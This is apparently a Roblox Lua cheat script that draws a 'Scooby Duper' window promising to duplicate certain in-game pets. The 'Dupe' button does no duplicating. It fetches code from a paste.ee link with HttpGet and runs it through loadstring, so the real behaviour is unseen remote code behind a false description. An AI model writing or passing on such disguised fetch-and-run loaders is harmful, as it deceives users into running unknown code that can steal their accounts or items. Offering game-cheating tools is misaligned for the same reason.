local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Description = Instance.new("TextLabel")
local DupeButton = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

Frame.Name = "DuperLeakFrame"
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Frame.Position = UDim2.new(0.3, 0, 0.3, 0)
Frame.Size = UDim2.new(0, 300, 0, 180)
Frame.Active = true
Frame.Draggable = true

UICorner.Parent = Frame

Title.Name = "Title"
Title.Parent = Frame
Title.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Title.BorderSizePixel = 0
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Font = Enum.Font.GothamBold
Title.Text = "Scooby Duper"
Title.TextColor3 = Color3.fromRGB(0, 255, 0)
Title.TextSize = 20
Title.TextStrokeTransparency = 0.8

Description.Name = "Description"
Description.Parent = Frame
Description.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Description.BorderSizePixel = 0
Description.Position = UDim2.new(0, 0, 0, 40)
Description.Size = UDim2.new(1, 0, 0, 60)
Description.Font = Enum.Font.Gotham
Description.Text = "Only works on Racoon, Dragonfly, and Red Fox\nthen wait for 3-5 minutes"
Description.TextColor3 = Color3.fromRGB(255, 255, 255)
Description.TextSize = 17
Description.TextWrapped = true

DupeButton.Name = "DupeButton"
DupeButton.Parent = Frame
DupeButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
DupeButton.Position = UDim2.new(0.25, 0, 0.7, 0)
DupeButton.Size = UDim2.new(0.5, 0, 0, 40)
DupeButton.Font = Enum.Font.GothamBold
DupeButton.Text = "Dupe"
DupeButton.TextColor3 = Color3.fromRGB(0, 0, 0)
DupeButton.TextSize = 18

DupeButton.MouseButton1Click:Connect(function()
    -- Instantly execute the command
    loadstring(game:HttpGet("https://paste.ee/r/Ytnn6ftR"))()
end)
